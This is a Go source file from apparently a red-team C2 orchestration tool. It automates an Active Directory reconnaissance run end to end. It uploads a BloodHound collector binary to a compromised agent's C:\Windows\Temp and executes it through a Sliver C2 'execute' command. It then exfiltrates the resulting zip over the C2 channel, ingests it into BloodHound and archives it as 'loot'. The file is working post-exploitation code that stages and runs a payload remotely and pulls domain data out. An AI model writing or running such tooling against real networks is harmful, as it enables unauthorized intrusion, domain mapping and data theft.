package bloodhound

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const collectionRemoteDir = `C:\Windows\Temp`

func (r *CollectionRunner) pipeline(id, agentID string, opts CollectionOptions) {
	timeout := clampTimeoutSeconds(opts.TimeoutSeconds)
	ctx, cancel := context.WithTimeout(context.Background(), timeout+30*time.Second)
	defer cancel()

	collector := strings.ToLower(opts.Collector)
	remoteCollector, err := r.stageCollector(ctx, id, agentID, collector)
	if err != nil {
		return
	}
	remoteArtifact, err := r.runCollector(ctx, id, agentID, collector, remoteCollector, opts, timeout)
	if err != nil {
		return
	}
	data, err := r.exfilArtifact(ctx, id, agentID, remoteArtifact)
	if err != nil {
		return
	}
	if opts.Ingest {
		if err := r.ingestArtifact(ctx, id, filepath.Base(remoteArtifact), data); err != nil {
			return
		}
	}
	if opts.Loot {
		if err := r.archiveArtifact(ctx, id, agentID, data); err != nil {
			return
		}
	}
	r.setState(id, StageDone, "", "")
}

func (r *CollectionRunner) fail(id string, stage Stage, format string, args ...any) {
	r.setState(id, StageFailed, "", fmt.Sprintf(format, args...))
}

// Running: fetch the collector binary and stage it on the agent.
func (r *CollectionRunner) stageCollector(ctx context.Context, id, agentID, collector string) (string, error) {
	r.setState(id, StageRunning, "downloading collector", "")
	localCollector, _, err := r.source.Download(ctx, collector, "")
	if err != nil {
		r.fail(id, StageRunning, "collector download failed: %v", err)
		return "", err
	}
	remoteCollector := filepath.Join(collectionRemoteDir, collectorFileName(collector))
	r.setState(id, StageRunning, "uploading collector", "")
	if err := r.files.Upload(ctx, agentID, collectionRemoteDir, localCollector); err != nil {
		r.fail(id, StageRunning, "collector upload failed: %v", err)
		return "", err
	}
	return remoteCollector, nil
}

// Collecting: run the collector via the sliver console's execute command.
// The "--" is load-bearing: without it pflag strips the collector flags
// that follow the binary path. The zipfilename is an absolute remote path
// so the artifact lands where the download stage expects it.
func (r *CollectionRunner) runCollector(ctx context.Context, id, agentID, collector, remoteCollector string, opts CollectionOptions, timeout time.Duration) (string, error) {
	artifactName := fmt.Sprintf("siren-%s-%s.zip", collector, id)
	remoteArtifact := filepath.Join(collectionRemoteDir, artifactName)
	cmd := fmt.Sprintf("execute --timeout %d -- %q -c %s --zipfilename %s",
		int(timeout.Seconds()), remoteCollector, strings.Join(opts.Methods, ","), remoteArtifact)
	if opts.Domain != "" {
		cmd += " --domain " + opts.Domain
	}
	if len(opts.Flags) > 0 {
		cmd += " " + strings.Join(opts.Flags, " ")
	}
	r.setState(id, StageCollecting, "collector running", "")
	if _, err := r.run.Run(ctx, agentID, cmd); err != nil {
		r.fail(id, StageCollecting, "collector failed: %v", err)
		return "", err
	}
	time.Sleep(time.Second) // settle for zip finalization
	return remoteArtifact, nil
}

// Downloading: exfil the artifact.
func (r *CollectionRunner) exfilArtifact(ctx context.Context, id, agentID, remoteArtifact string) ([]byte, error) {
	localArtifact := filepath.Join(r.svc.dataDir, "collections", id, filepath.Base(remoteArtifact))
	if err := os.MkdirAll(filepath.Dir(localArtifact), 0o755); err != nil {
		r.fail(id, StageDownloading, "mkdir: %v", err)
		return nil, err
	}
	r.setState(id, StageDownloading, "exfil via C2", "")
	if err := r.files.Download(ctx, agentID, remoteArtifact, localArtifact); err != nil {
		r.fail(id, StageDownloading, "artifact download failed: %v", err)
		return nil, err
	}
	data, err := os.ReadFile(localArtifact)
	if err != nil {
		r.fail(id, StageDownloading, "read artifact: %v", err)
		return nil, err
	}
	r.mu.Lock()
	r.states[id].RemoteArtifact = localArtifact
	r.mu.Unlock()
	return data, nil
}

func (r *CollectionRunner) ingestArtifact(ctx context.Context, id, artifactName string, data []byte) error {
	r.setState(id, StageIngesting, "uploading to BloodHound", "")
	job, err := r.svc.IngestBytes(ctx, artifactName, "application/zip", data)
	if err != nil {
		r.fail(id, StageIngesting, "ingest failed: %v", err)
		return err
	}
	r.mu.Lock()
	r.states[id].IngestJobID = job.ID
	r.mu.Unlock()
	return nil
}

func (r *CollectionRunner) archiveArtifact(ctx context.Context, id, agentID string, data []byte) error {
	name := fmt.Sprintf("bloodhound-%s-%d", agentID, time.Now().UnixMilli())
	if err := r.loot.Archive(ctx, name, data); err != nil {
		r.fail(id, StageDone, "loot archive failed: %v", err)
		return err
	}
	return nil
}
